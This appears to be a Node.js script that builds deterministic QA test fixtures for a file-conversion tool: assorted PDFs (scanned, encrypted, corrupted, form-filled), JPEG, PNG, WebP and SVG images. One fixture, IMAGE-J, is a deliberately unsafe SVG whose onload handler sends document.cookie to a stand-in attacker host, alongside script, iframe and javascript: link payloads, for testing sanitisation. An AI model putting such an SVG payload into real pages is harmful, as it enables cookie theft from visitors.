// Fresh scenario fixture library for the full functional + output-quality audit.
//   node qa/scripts/fs-fixtures.mjs      ->  qa/fresh-scenario-fixtures/  (+ README.md)
// Deterministic (seeded PRNG). Nothing here is a real document. The binaries are git-ignored (up to 20 MB
// each) and rebuilt on demand; README.md with exact sizes, hashes and structure is committed.
import fs from "node:fs";
import path from "node:path";
import zlib from "node:zlib";
import crypto from "node:crypto";
import { execFileSync } from "node:child_process";
import { PDFDocument, PDFName, PDFNumber, PDFRawStream, StandardFonts, degrees, rgb, pushGraphicsState, popGraphicsState, concatTransformationMatrix, drawObject } from "pdf-lib";
import { createCanvas } from "@napi-rs/canvas";

const OUT = path.resolve("qa/fresh-scenario-fixtures");
fs.mkdirSync(OUT, { recursive: true });
const rows = [];
const write = (id, name, data, what, structure) => {
  fs.writeFileSync(path.join(OUT, name), data);
  const bytes = fs.readFileSync(path.join(OUT, name));
  rows.push({ id, name, bytes: bytes.length, sha: crypto.createHash("sha256").update(bytes).digest("hex").slice(0, 12), what, structure });
  console.log(`${id.padEnd(9)} ${name.padEnd(44)} ${bytes.length.toLocaleString("en-US").padStart(12)}  ${what}`);
};

// ------------------------------------------------------------------ drawing helpers
function rng(seed) {
  let a = seed >>> 0;
  return () => {
    a |= 0;
    a = (a + 0x6d2b79f5) | 0;
    let t = Math.imul(a ^ (a >>> 15), 1 | a);
    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
const clamp = (v) => Math.max(0, Math.min(255, v));

function photo(w, h, seed, { noise = 24, alpha = false } = {}) {
  const r = rng(seed);
  const c = createCanvas(w, h);
  const g = c.getContext("2d");
  const grad = g.createLinearGradient(0, 0, w, h);
  grad.addColorStop(0, `hsl(${Math.floor(r() * 360)},55%,35%)`);
  grad.addColorStop(0.5, `hsl(${Math.floor(r() * 360)},70%,60%)`);
  grad.addColorStop(1, `hsl(${Math.floor(r() * 360)},45%,30%)`);
  g.fillStyle = grad;
  g.fillRect(0, 0, w, h);
  for (let i = 0; i < 160; i++) {
    g.fillStyle = `hsla(${Math.floor(r() * 360)},60%,${30 + r() * 40}%,0.5)`;
    g.beginPath();
    g.arc(r() * w, r() * h, (0.02 + r() * 0.12) * Math.min(w, h), 0, Math.PI * 2);
    g.fill();
  }
  // A few hard edges and fine lines, like a real scene — they show up badly when over-compressed.
  g.strokeStyle = "rgba(255,255,255,0.8)";
  g.lineWidth = Math.max(1, w / 800);
  for (let i = 0; i < 30; i++) {
    g.beginPath();
    g.moveTo(r() * w, r() * h);
    g.lineTo(r() * w, r() * h);
    g.stroke();
  }
  if (noise > 0) {
    const img = g.getImageData(0, 0, w, h);
    const d = img.data;
    for (let i = 0; i < d.length; i += 4) {
      const n = (r() - 0.5) * noise * 2;
      d[i] = clamp(d[i] + n);
      d[i + 1] = clamp(d[i + 1] + n);
      d[i + 2] = clamp(d[i + 2] + n);
    }
    g.putImageData(img, 0, 0);
  }
  if (alpha) {
    g.globalCompositeOperation = "destination-in";
    g.beginPath();
    g.ellipse(w / 2, h / 2, w * 0.44, h * 0.44, 0, 0, Math.PI * 2);
    g.fill();
    g.globalCompositeOperation = "source-over";
  }
  return c;
}

function scanPage(title, seed, { w, h, grain, gray = false, lines = 44 }) {
  const r = rng(seed);
  const c = createCanvas(w, h);
  const g = c.getContext("2d");
  g.fillStyle = gray ? "#efefef" : "#f3f0e8";
  g.fillRect(0, 0, w, h);
  g.save();
  g.translate(w / 2, h / 2);
  g.rotate((r() - 0.5) * 0.01);
  g.translate(-w / 2, -h / 2);
  g.fillStyle = "#1d1d1d";
  g.font = `bold ${Math.round(w * 0.04)}px Arial`;
  g.fillText(title, w * 0.08, h * 0.08);
  g.font = `${Math.round(w * 0.019)}px Arial`;
  for (let i = 0; i < lines; i++) g.fillText(`Line ${i + 1}: The quick brown fox jumps over the lazy dog ${1000 + i * 7}, ref ${seed}-${i}.`, w * 0.08, h * 0.13 + i * (h * 0.0185));
  g.restore();
  g.drawImage(photo(Math.round(w * 0.3), Math.round(h * 0.15), seed + 500, { noise: 18 }), w * 0.6, h * 0.82);
  const img = g.getImageData(0, 0, w, h);
  const d = img.data;
  for (let i = 0; i < d.length; i += 4) {
    const n = (r() - 0.5) * grain * 2;
    if (gray) {
      const v = clamp(0.3 * d[i] + 0.59 * d[i + 1] + 0.11 * d[i + 2] + n);
      d[i] = d[i + 1] = d[i + 2] = v;
    } else {
      d[i] = clamp(d[i] + n);
      d[i + 1] = clamp(d[i + 1] + n);
      d[i + 2] = clamp(d[i + 2] + n);
    }
  }
  g.putImageData(img, 0, 0);
  return c;
}

/** Highest JPEG quality whose encoding is at most `target` bytes (bisection), or the lowest tried. */
function jpegNear(canvas, target, lo = 30, hi = 98) {
  let best = canvas.toBuffer("image/jpeg", lo);
  while (lo <= hi) {
    const q = Math.floor((lo + hi) / 2);
    const b = canvas.toBuffer("image/jpeg", q);
    if (b.length <= target) {
      best = b;
      lo = q + 1;
    } else hi = q - 1;
  }
  return best;
}

function ascii85(bytes) {
  let out = "";
  for (let i = 0; i < bytes.length; i += 4) {
    const chunk = [bytes[i], bytes[i + 1] ?? 0, bytes[i + 2] ?? 0, bytes[i + 3] ?? 0];
    const n = Math.min(4, bytes.length - i);
    let v = ((chunk[0] << 24) | (chunk[1] << 16) | (chunk[2] << 8) | chunk[3]) >>> 0;
    if (v === 0 && n === 4) {
      out += "z";
      continue;
    }
    const digits = [];
    for (let k = 0; k < 5; k++) {
      digits.unshift(String.fromCharCode((v % 85) + 33));
      v = Math.floor(v / 85);
    }
    out += digits.slice(0, n + 1).join("");
  }
  // Line-wrap like real producers do.
  return (out.match(/.{1,76}/g) ?? []).join("\n") + "~>";
}

/** Embeds raw pixels as a lossless image XObject: DeviceRGB or DeviceGray, Flate or ASCII85+Flate. */
function embedRaw(doc, canvas, { gray = false, ascii = false } = {}) {
  const { width: w, height: h } = canvas;
  const d = canvas.getContext("2d").getImageData(0, 0, w, h).data;
  const px = new Uint8Array(w * h * (gray ? 1 : 3));
  for (let i = 0, j = 0; i < d.length; i += 4) {
    if (gray) px[j++] = d[i];
    else {
      px[j++] = d[i];
      px[j++] = d[i + 1];
      px[j++] = d[i + 2];
    }
  }
  let data = new Uint8Array(zlib.deflateSync(px, { level: 6 }));
  const dict = doc.context.obj({
    Type: "XObject",
    Subtype: "Image",
    Width: w,
    Height: h,
    ColorSpace: gray ? "DeviceGray" : "DeviceRGB",
    BitsPerComponent: 8,
  });
  if (ascii) {
    data = new Uint8Array(Buffer.from(ascii85(data), "latin1"));
    dict.set(PDFName.of("Filter"), doc.context.obj(["ASCII85Decode", "FlateDecode"]));
  } else dict.set(PDFName.of("Filter"), PDFName.of("FlateDecode"));
  dict.set(PDFName.of("Length"), PDFNumber.of(data.length));
  return doc.context.register(PDFRawStream.of(dict, data));
}

/** Draws a registered image XObject on a page (pdf-lib's drawImage needs its own embed type). */
function drawXObject(page, ref, name, { x, y, width, height }) {
  const key = page.node.newXObject(name, ref);
  page.pushOperators(pushGraphicsState(), concatTransformationMatrix(width, 0, 0, height, x, y), drawObject(key), popGraphicsState());
}

async function withFonts(doc) {
  return { font: await doc.embedFont(StandardFonts.Helvetica), bold: await doc.embedFont(StandardFonts.HelveticaBold) };
}

function paragraph(page, font, text, x, y, size, width, lineGap = 1.35) {
  const words = text.split(" ");
  let line = "";
  for (const w of words) {
    const next = line ? `${line} ${w}` : w;
    if (font.widthOfTextAtSize(next, size) > width) {
      page.drawText(line, { x, y, size, font });
      y -= size * lineGap;
      line = w;
    } else line = next;
  }
  if (line) page.drawText(line, { x, y, size, font });
  return y - size * lineGap;
}

const LOREM = "Quarterly operations review. Revenue grew in every region, led by the northern sites where the new intake process shortened turnaround from nine days to four. Staffing remained stable; two vacancies were filled internally. Supplier costs rose slightly because of freight surcharges, partly offset by renegotiated packaging contracts. The audit committee reviewed the controls for purchase approvals and found no exceptions. Next quarter the team will pilot the scheduling tool in two locations and report the results.";

/** Appends an incremental update that re-creates the catalog at the same object number, generation 1 —
 * the shape of the user's scan (original + a "content credentials" update) that exposed the corruption bug. */
async function withGenerationOneCatalog(bytes) {
  const doc = await PDFDocument.load(bytes);
  const pagesRef = doc.catalog.get(PDFName.of("Pages"));
  const text = Buffer.from(bytes).toString("latin1");
  const prev = Number([...text.matchAll(/startxref\s+(\d+)/g)].pop()[1]);
  const n = doc.context.trailerInfo.Root.objectNumber;
  const size = doc.context.largestObjectNumber + 1;
  let update = "\n";
  const objOffset = bytes.length + update.length;
  update += `${n} 1 obj\n<< /Type /Catalog /Pages ${pagesRef.objectNumber} 0 R >>\nendobj\n`;
  const xrefOffset = bytes.length + update.length;
  update += `xref\n0 1\n0000000000 65535 f \n${n} 1\n${String(objOffset).padStart(10, "0")} 00001 n \n`;
  update += `trailer\n<< /Size ${size} /Root ${n} 1 R /Prev ${prev} >>\nstartxref\n${xrefOffset}\n%%EOF\n`;
  return Buffer.concat([Buffer.from(bytes), Buffer.from(update, "latin1")]);
}

// ================================================================== PDFs
// PDF-A: text-heavy report, ~300 KB, the way many producers write it: page text stored uncompressed
// (no /Filter on content streams), standard fonts, one small logo. Text is ~95% of the bytes.
{
  async function build(pages) {
    const doc = await PDFDocument.create();
    const { font, bold } = await withFonts(doc);
    const logo = await doc.embedJpg(photo(240, 120, 1000, { noise: 4 }).toBuffer("image/jpeg", 80));
    for (let p = 1; p <= pages; p++) {
      const page = doc.addPage([612, 792]);
      if (p === 1) page.drawImage(logo, { x: 460, y: 730, width: 96, height: 48 });
      page.drawText(`Operations Report — Section ${p}`, { x: 56, y: 740, size: 18, font: bold });
      let y = 712;
      for (let k = 0; k < 6 && y > 90; k++) y = paragraph(page, font, `${p}.${k + 1} ${LOREM}`, 56, y, 10, 500) - 6;
    }
    const tmp = path.join(OUT, "_tmp-a.pdf"), dst = path.join(OUT, "_tmp-a-raw.pdf");
    fs.writeFileSync(tmp, await doc.save({ useObjectStreams: false }));
    execFileSync("python", ["-c", `import pikepdf; p=pikepdf.open(r"${tmp}"); p.save(r"${dst}", compress_streams=False, stream_decode_level=pikepdf.StreamDecodeLevel.generalized, object_stream_mode=pikepdf.ObjectStreamMode.disable); p.close()`]);
    const bytes = fs.readFileSync(dst);
    fs.rmSync(tmp);
    fs.rmSync(dst);
    return bytes;
  }
  const probe = await build(10);
  const pages = Math.ceil((300_000 / probe.length) * 10);
  write("PDF-A", "PDF-A-text-heavy-300k.pdf", await build(pages), `Text-heavy report: ${pages} pages of native text, content streams stored uncompressed, one small logo`, "native text (Helvetica), unfiltered content streams, 1 DCTDecode logo, classic xref");
}

// PDF-B: ~800 KB mixed — text, JPEG photos, one ASCII85+Flate RGB diagram, one Flate grayscale figure.
{
  const doc = await PDFDocument.create();
  const { font, bold } = await withFonts(doc);
  for (let p = 0; p < 6; p++) {
    const page = doc.addPage([612, 792]);
    page.drawText(`Field Survey — Page ${p + 1} of 6`, { x: 56, y: 740, size: 18, font: bold });
    paragraph(page, font, LOREM, 56, 712, 10, 500);
    if (p < 4) page.drawImage(await doc.embedJpg(jpegNear(photo(1200, 800, 2000 + p), 140_000)), { x: 56, y: 250, width: 500, height: 333 });
    if (p === 4) drawXObject(page, embedRaw(doc, photo(360, 240, 2100, { noise: 0 }), { ascii: true }), "ImA85", { x: 56, y: 250, width: 500, height: 333 });
    if (p === 5) drawXObject(page, embedRaw(doc, scanPage("GRAY FIGURE", 2200, { w: 420, h: 300, grain: 4, gray: true, lines: 8 }), { gray: true }), "ImGray", { x: 56, y: 250, width: 500, height: 357 });
  }
  write("PDF-B", "PDF-B-mixed-800k.pdf", await doc.save(), "Mixed 6-page survey: text + 4 JPEG photos + ASCII85+Flate RGB diagram + Flate grayscale figure", "DCTDecode RGB, [/ASCII85Decode /FlateDecode] RGB, FlateDecode DeviceGray");
}

// PDF-C: ~3.8 MB scan with an incremental update (catalog at generation 1) — the user's bug shape.
{
  const doc = await PDFDocument.create();
  for (let i = 0; i < 2; i++) {
    const jpg = await doc.embedJpg(jpegNear(scanPage(`SCANNED FORM ${i + 1}`, 3000 + i, { w: 2480, h: 3508, grain: 14 }), 1_880_000));
    doc.addPage([595, 842]).drawImage(jpg, { x: 0, y: 0, width: 595, height: 842 });
  }
  write("PDF-C", "PDF-C-scan-3.8mb-incremental.pdf", await withGenerationOneCatalog(await doc.save({ useObjectStreams: false })), "2-page 300 dpi A4 scan (JPEG), incrementally updated: catalog re-created as object N generation 1", "DCTDecode RGB 2480x3508; classic xref + incremental update with /Prev; catalog gen 1 (the reported corruption trigger)");
}

// PDF-D: ~5 MB photo-heavy.
{
  const doc = await PDFDocument.create();
  const { bold } = await withFonts(doc);
  for (let i = 0; i < 5; i++) {
    const page = doc.addPage([792, 612]);
    page.drawText(`Site photo ${i + 1}`, { x: 40, y: 580, size: 16, font: bold });
    page.drawImage(await doc.embedJpg(jpegNear(photo(2400, 1600, 4000 + i), 1_000_000)), { x: 40, y: 40, width: 712, height: 475 });
  }
  write("PDF-D", "PDF-D-photo-heavy-5mb.pdf", await doc.save(), "5 landscape pages, each a 2400x1600 photo", "DCTDecode RGB");
}

// PDF-E: ~10 MB scan (300 dpi letter, 4 pages).
{
  const doc = await PDFDocument.create();
  for (let i = 0; i < 4; i++) {
    const jpg = await doc.embedJpg(jpegNear(scanPage(`SCANNED STATEMENT ${i + 1}`, 5000 + i, { w: 2550, h: 3300, grain: 18 }), 2_500_000));
    doc.addPage([612, 792]).drawImage(jpg, { x: 0, y: 0, width: 612, height: 792 });
  }
  write("PDF-E", "PDF-E-scan-10mb.pdf", await doc.save(), "4-page 300 dpi letter scan", "DCTDecode RGB 2550x3300");
}

// PDF-F: ~20 MB photo-heavy.
{
  const doc = await PDFDocument.create();
  const { bold } = await withFonts(doc);
  for (let i = 0; i < 8; i++) {
    const page = doc.addPage([792, 612]);
    page.drawText(`Portfolio ${i + 1}`, { x: 40, y: 580, size: 16, font: bold });
    page.drawImage(await doc.embedJpg(jpegNear(photo(3600, 2400, 6000 + i, { noise: 26 }), 2_500_000)), { x: 40, y: 40, width: 712, height: 475 });
  }
  write("PDF-F", "PDF-F-photo-heavy-20mb.pdf", await doc.save(), "8 pages, each a 3600x2400 photo", "DCTDecode RGB");
}

// PDF-G: already optimized — small, low-quality, downsampled images.
{
  const doc = await PDFDocument.create();
  const { font, bold } = await withFonts(doc);
  for (let i = 0; i < 3; i++) {
    const page = doc.addPage([612, 792]);
    page.drawText(`Newsletter page ${i + 1}`, { x: 56, y: 740, size: 18, font: bold });
    paragraph(page, font, LOREM, 56, 712, 10, 500);
    page.drawImage(await doc.embedJpg(photo(900, 600, 7000 + i, { noise: 8 }).toBuffer("image/jpeg", 45)), { x: 56, y: 200, width: 500, height: 333 });
  }
  write("PDF-G", "PDF-G-already-optimized.pdf", await doc.save({ useObjectStreams: true }), "Already optimized: 3 pages, 900x600 JPEGs at quality 45", "DCTDecode RGB q45, object streams");
}

// PDF-H: multi-page text + image (10 pages), images as lossless Flate RGB (from PNG).
{
  const doc = await PDFDocument.create();
  const { font, bold } = await withFonts(doc);
  for (let i = 0; i < 10; i++) {
    const page = doc.addPage([612, 792]);
    page.drawText(`HANDBOOK — Page ${i + 1} of 10`, { x: 56, y: 740, size: 20, font: bold });
    page.drawText(`Marker H${i + 1}`, { x: 56, y: 712, size: 12, font });
    paragraph(page, font, LOREM, 56, 690, 10, 500);
    page.drawImage(await doc.embedPng(photo(700, 420, 8000 + i, { noise: 4 }).toBuffer("image/png")), { x: 56, y: 150, width: 500, height: 300 });
  }
  write("PDF-H", "PDF-H-multipage-text-image.pdf", await doc.save(), "10 pages, text + a lossless PNG-derived image per page, 'HANDBOOK — Page N of 10'", "FlateDecode RGB images (from PNG)");
}

// PDF-I: rotated pages.
{
  const doc = await PDFDocument.create();
  const { font, bold } = await withFonts(doc);
  const rot = [0, 90, 180, 270];
  for (let i = 0; i < 4; i++) {
    const page = doc.addPage([612, 792]);
    page.drawText(`ROTATED — Page ${i + 1} (/Rotate ${rot[i]})`, { x: 56, y: 740, size: 20, font: bold });
    paragraph(page, font, LOREM, 56, 700, 10, 500);
    page.drawImage(await doc.embedJpg(photo(800, 500, 9000 + i).toBuffer("image/jpeg", 85)), { x: 56, y: 200, width: 400, height: 250 });
    page.setRotation(degrees(rot[i]));
  }
  write("PDF-I", "PDF-I-rotated.pdf", await doc.save(), "4 pages with /Rotate 0, 90, 180, 270 (text + photo)", "page /Rotate");
}

// PDF-J: mixed page sizes.
{
  const doc = await PDFDocument.create();
  const { bold } = await withFonts(doc);
  const sizes = [["Letter", 612, 792], ["A4", 595, 842], ["Legal", 612, 1008], ["A5 landscape", 595, 420], ["Tabloid", 792, 1224], ["Receipt", 226, 600]];
  sizes.forEach(([label, w, h], i) => {
    const page = doc.addPage([w, h]);
    page.drawRectangle({ x: 10, y: 10, width: w - 20, height: h - 20, borderColor: rgb(0.1, 0.3, 0.7), borderWidth: 2 });
    page.drawText(`SIZE ${i + 1}: ${label}`, { x: 20, y: h - 40, size: Math.min(18, w / 14), font: bold });
    page.drawText(`${w} x ${h} pt`, { x: 20, y: h - 70, size: 12, font: bold });
  });
  write("PDF-J", "PDF-J-mixed-page-sizes.pdf", await doc.save(), "6 pages: Letter, A4, Legal, A5 landscape, Tabloid, 226x600 receipt", "mixed MediaBox");
}

// PDF-K: native text invoice.
{
  const doc = await PDFDocument.create();
  const { font, bold } = await withFonts(doc);
  const page = doc.addPage([612, 792]);
  page.drawText("INVOICE", { x: 60, y: 720, size: 28, font: bold });
  [["Billed to:", "Jordan Smith"], ["Invoice date:", "12/20/2026"], ["Service:", "Consultation"], ["Total due:", "$1,250.00"]].forEach(([k, v], i) => {
    page.drawText(k, { x: 60, y: 660 - i * 34, size: 14, font });
    page.drawText(v, { x: 200, y: 660 - i * 34, size: 14, font });
  });
  for (let l = 0; l < 14; l++) page.drawText(`Terms line ${l + 1}: payment is due within thirty days of the invoice date.`, { x: 60, y: 480 - l * 18, size: 11, font });
  const page2 = doc.addPage([612, 792]);
  page2.drawText("Payment history", { x: 60, y: 720, size: 20, font: bold });
  paragraph(page2, font, LOREM, 60, 690, 11, 490);
  write("PDF-K", "PDF-K-native-text.pdf", await doc.save(), "2-page native-text invoice ('Jordan Smith', '12/20/2026', 'Consultation', '$1,250.00')", "text only");
}

// PDF-L: image-only scan with grayscale Flate + ASCII85+Flate RGB pages (no native text).
{
  const doc = await PDFDocument.create();
  const w = 1275, h = 1650; // 150 dpi letter
  const p1 = doc.addPage([612, 792]);
  drawXObject(p1, embedRaw(doc, scanPage("SCANNED LETTER - PAGE ONE", 10000, { w, h, grain: 10, gray: true, lines: 40 }), { gray: true }), "Im1", { x: 0, y: 0, width: 612, height: 792 });
  const p2 = doc.addPage([612, 792]);
  drawXObject(p2, embedRaw(doc, scanPage("SCANNED LETTER - PAGE TWO", 10001, { w, h, grain: 10, lines: 40 }), { ascii: true }), "Im2", { x: 0, y: 0, width: 612, height: 792 });
  write("PDF-L", "PDF-L-image-only-scan-gray-a85.pdf", await doc.save(), "2-page image-only scan (no text layer): page 1 Flate DeviceGray, page 2 ASCII85+Flate DeviceRGB, 150 dpi", "FlateDecode DeviceGray; [/ASCII85Decode /FlateDecode] DeviceRGB");
}

// PDF-M: AcroForm with filled fields.
{
  const doc = await PDFDocument.create();
  const { font, bold } = await withFonts(doc);
  const page = doc.addPage([612, 792]);
  page.drawText("Application form", { x: 60, y: 730, size: 22, font: bold });
  const form = doc.getForm();
  const label = (t, y) => page.drawText(t, { x: 60, y, size: 12, font });
  label("Full name", 680);
  const name = form.createTextField("applicant.name");
  name.setText("Jordan Smith");
  name.addToPage(page, { x: 200, y: 672, width: 300, height: 22 });
  label("Email", 640);
  const email = form.createTextField("applicant.email");
  email.setText("jordan@example.com");
  email.addToPage(page, { x: 200, y: 632, width: 300, height: 22 });
  label("Plan", 600);
  const plan = form.createDropdown("applicant.plan");
  plan.addOptions(["Basic", "Standard", "Premium"]);
  plan.select("Standard");
  plan.addToPage(page, { x: 200, y: 592, width: 160, height: 22 });
  label("I agree to the terms", 560);
  const agree = form.createCheckBox("applicant.agree");
  agree.check();
  agree.addToPage(page, { x: 200, y: 556, width: 16, height: 16 });
  write("PDF-M", "PDF-M-acroform.pdf", await doc.save(), "AcroForm: 2 filled text fields, a dropdown (Standard), a checked checkbox", "AcroForm with appearance streams");
}

// PDF-N: metadata-rich.
{
  const doc = await PDFDocument.create();
  const { font, bold } = await withFonts(doc);
  for (let i = 0; i < 3; i++) {
    const page = doc.addPage([612, 792]);
    page.drawText(`Annual Summary — Page ${i + 1}`, { x: 56, y: 740, size: 20, font: bold });
    paragraph(page, font, LOREM, 56, 710, 11, 500);
  }
  doc.setTitle("Annual Summary 2026");
  doc.setAuthor("QA Author");
  doc.setSubject("Metadata fixture");
  doc.setKeywords(["annual", "summary", "fixture"]);
  doc.setCreator("fs-fixtures.mjs");
  doc.setProducer("TheFileConvert QA");
  doc.setLanguage("en-US");
  const xmp = `<?xpacket begin="\uFEFF" id="W5M0MpCehiHzreSzNTczkc9d"?><x:xmpmeta xmlns:x="adobe:ns:meta/"><rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:title><rdf:Alt><rdf:li xml:lang="x-default">Annual Summary 2026</rdf:li></rdf:Alt></dc:title><dc:creator><rdf:Seq><rdf:li>QA Author</rdf:li></rdf:Seq></dc:creator></rdf:Description></rdf:RDF></x:xmpmeta><?xpacket end="w"?>`;
  const meta = doc.context.stream(xmp, { Type: "Metadata", Subtype: "XML" });
  doc.catalog.set(PDFName.of("Metadata"), doc.context.register(meta));
  const labels = doc.context.obj({ Nums: [0, { S: "r" }, 1, { S: "D" }] });
  doc.catalog.set(PDFName.of("PageLabels"), labels);
  write("PDF-N", "PDF-N-metadata-rich.pdf", await doc.save(), "3 pages; Info (Title, Author, Subject, Keywords, Creator, Producer), XMP stream, /Lang, page labels", "Info dict + XMP /Metadata + /PageLabels");
}

// PDF-O: corrupted — the first 40% of PDF-B followed by garbage.
{
  const b = fs.readFileSync(path.join(OUT, "PDF-B-mixed-800k.pdf"));
  const r = rng(11);
  const junk = Buffer.from(Array.from({ length: 4096 }, () => Math.floor(r() * 256)));
  write("PDF-O", "PDF-O-corrupted.pdf", Buffer.concat([b.subarray(0, Math.floor(b.length * 0.4)), junk]), "Corrupted: first 40% of PDF-B then 4 KB of random bytes (no xref/trailer)", "truncated");
}

// PDF-P: encrypted (negative) — user password required.
{
  const src = path.join(OUT, "PDF-K-native-text.pdf");
  const dst = path.join(OUT, "PDF-P-encrypted.pdf");
  execFileSync("python", ["-c", `import pikepdf; p=pikepdf.open(r"${src}"); p.save(r"${dst}", encryption=pikepdf.Encryption(owner="owner-pw", user="user-pw", R=6)); p.close()`]);
  write("PDF-P", "PDF-P-encrypted.pdf", fs.readFileSync(dst), "Encrypted copy of PDF-K (AES-256, user password 'user-pw')", "Encrypt dict R6");
}

// PDF-Q: encrypted with an owner password only — opens without a password (like many bank statements),
// but its content is encrypted, so tools that rewrite PDFs must refuse it rather than corrupt it.
{
  const src = path.join(OUT, "PDF-B-mixed-800k.pdf");
  const dst = path.join(OUT, "PDF-Q-owner-password-only.pdf");
  execFileSync("python", ["-c", `import pikepdf; p=pikepdf.open(r"${src}"); p.save(r"${dst}", encryption=pikepdf.Encryption(owner="owner-pw", user="", R=3, aes=False, metadata=False), object_stream_mode=pikepdf.ObjectStreamMode.disable); p.close()`]);
  write("PDF-Q", "PDF-Q-owner-password-only.pdf", fs.readFileSync(dst), "Owner-password-only encryption (RC4-128) of PDF-B: opens without a password, content encrypted", "Encrypt dict R3, empty user password");
}

// ================================================================== Images
{
  write("IMAGE-A", "IMAGE-A-optimized-250k.jpg", jpegNear(photo(1920, 1280, 20001, { noise: 20 }), 250_000), "Optimized JPEG ~250 KB, 1920x1280", "baseline JPEG, no metadata");
  write("IMAGE-B", "IMAGE-B-photo-500k.jpg", jpegNear(photo(2400, 1600, 20002, { noise: 22 }), 500_000), "JPEG ~500 KB, 2400x1600", "baseline JPEG");
  write("IMAGE-C", "IMAGE-C-photo-3mb.jpg", jpegNear(photo(4000, 3000, 20003, { noise: 26 }), 3_000_000), "JPEG ~3 MB, 4000x3000", "baseline JPEG");
  write("IMAGE-D", "IMAGE-D-photo-8mb.jpg", jpegNear(photo(6000, 4000, 20004, { noise: 30 }), 8_000_000, 60, 100), "JPEG ~8 MB, 6000x4000", "baseline JPEG");
  write("IMAGE-E", "IMAGE-E-photo-15mb.jpg", jpegNear(photo(8000, 6000, 20005, { noise: 34 }), 15_000_000, 60, 100), "JPEG ~15 MB, 8000x6000 (48 MP)", "baseline JPEG");
  write("IMAGE-F", "IMAGE-F-transparent.png", photo(1800, 1400, 20006, { noise: 14, alpha: true }).toBuffer("image/png"), "Transparent PNG 1800x1400 (photo inside an ellipse, clear corners)", "PNG RGBA");
  write("IMAGE-G", "IMAGE-G-large-photo.png", photo(3000, 2000, 20007, { noise: 18 }).toBuffer("image/png"), "Large photographic PNG 3000x2000 (opaque)", "PNG RGB(A) opaque");
  write("IMAGE-H", "IMAGE-H-photo.webp", photo(2400, 1600, 20008, { noise: 16 }).toBuffer("image/webp", 85), "WebP 2400x1600 photo", "lossy WebP");
  write("IMAGE-I", "IMAGE-I-vector.svg", Buffer.from(`<svg xmlns="http://www.w3.org/2000/svg" width="800" height="500" viewBox="0 0 800 500"><rect width="800" height="500" fill="#f5f7fb"/><circle cx="220" cy="250" r="150" fill="#2563eb"/><rect x="420" y="120" width="280" height="260" rx="30" fill="#f59e0b"/><text x="400" y="470" font-family="Arial" font-size="32" text-anchor="middle" fill="#111">Vector fixture</text></svg>`), "Clean SVG 800x500 (shapes + text)", "SVG");
  write(
    "IMAGE-J",
    "IMAGE-J-unsafe.svg",
    Buffer.from(
      `<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="600" height="400" onload="fetch('https://attacker.invalid/x?c='+document.cookie)"><script>fetch('https://attacker.invalid/steal')</script><rect width="600" height="400" fill="#fde68a"/><image href="https://attacker.invalid/track.png" x="0" y="0" width="10" height="10"/><foreignObject width="100" height="50"><iframe xmlns="http://www.w3.org/1999/xhtml" src="https://attacker.invalid/frame"></iframe></foreignObject><a xlink:href="javascript:alert(1)"><text x="40" y="200" font-size="36" font-family="Arial">Unsafe SVG fixture</text></a></svg>`
    ),
    "SVG with <script>, onload handler, external <image>, <foreignObject><iframe>, javascript: link",
    "SVG (unsafe)"
  );
}
// IMAGE-K: EXIF-rich JPEG (camera make/model, date, software, artist, GPS, Orientation 6 = stored sideways).
{
  const tiff = [];
  const le16 = (v) => [v & 255, (v >> 8) & 255];
  const le32 = (v) => [v & 255, (v >> 8) & 255, (v >> 16) & 255, (v >>> 24) & 255];
  function ifd(entries, base) {
    // entries: [tag, type, count, valueBytes]; returns bytes of the IFD + its data area, placed at `base`.
    const head = 2 + entries.length * 12 + 4;
    let data = [];
    const out = [...le16(entries.length)];
    for (const [tag, type, count, value] of entries) {
      out.push(...le16(tag), ...le16(type), ...le32(count));
      if (value.length <= 4) out.push(...value, ...Array(4 - value.length).fill(0));
      else {
        out.push(...le32(base + head + data.length));
        data = data.concat(value);
        if (data.length % 2) data.push(0);
      }
    }
    out.push(...le32(0));
    return [...out, ...data];
  }
  const ascii = (s) => [...Buffer.from(s + "\0", "latin1")];
  const rational = (...pairs) => pairs.flatMap(([n, d]) => [...le32(n), ...le32(d)]);
  // Layout: header(8) | IFD0 | GPS IFD
  const ifd0Entries = (gpsOffset) => [
    [0x010f, 2, 12, ascii("QA Camera Co")],
    [0x0110, 2, 12, ascii("QA-Phone 15")],
    [0x0112, 3, 1, le16(6)],
    [0x0131, 2, 14, ascii("QA Firmware 2")],
    [0x0132, 2, 20, ascii("2026:09:20 14:32:10")],
    [0x013b, 2, 13, ascii("Test Artist")],
    [0x8825, 4, 1, le32(gpsOffset)],
  ];
  const ifd0Len = ifd(ifd0Entries(0), 8).length;
  const gpsOffset = 8 + ifd0Len;
  const gps = ifd(
    [
      [0x0000, 1, 4, [2, 3, 0, 0]],
      [0x0001, 2, 2, ascii("N")],
      [0x0002, 5, 3, rational([37, 1], [46, 1], [2951, 100])],
      [0x0003, 2, 2, ascii("W")],
      [0x0004, 5, 3, rational([122, 1], [25, 1], [912, 100])],
    ],
    gpsOffset
  );
  tiff.push(0x49, 0x49, 0x2a, 0x00, ...le32(8), ...ifd(ifd0Entries(gpsOffset), 8), ...gps);
  const app1Body = Buffer.concat([Buffer.from("Exif\0\0", "latin1"), Buffer.from(tiff)]);
  const app1 = Buffer.concat([Buffer.from([0xff, 0xe1]), Buffer.from([((app1Body.length + 2) >> 8) & 255, (app1Body.length + 2) & 255]), app1Body]);
  // Stored landscape 1600x1200 with an arrow pointing "up" after a 90° clockwise turn (Orientation 6).
  const c = photo(1600, 1200, 20011, { noise: 16 });
  const g = c.getContext("2d");
  g.fillStyle = "#fff";
  g.font = "bold 90px Arial";
  g.save();
  g.translate(800, 600);
  g.rotate(-Math.PI / 2);
  g.fillText("TOP ↑", -130, 30);
  g.restore();
  const jpg = c.toBuffer("image/jpeg", 88);
  write("IMAGE-K", "IMAGE-K-exif-rich.jpg", Buffer.concat([jpg.subarray(0, 2), app1, jpg.subarray(2)]), "EXIF-rich JPEG: Make/Model/DateTime/Software/Artist, GPS 37°46'N 122°25'W, Orientation 6 (stored 1600x1200, displays 1200x1600)", "APP1 EXIF (IFD0 + GPS IFD)");
}
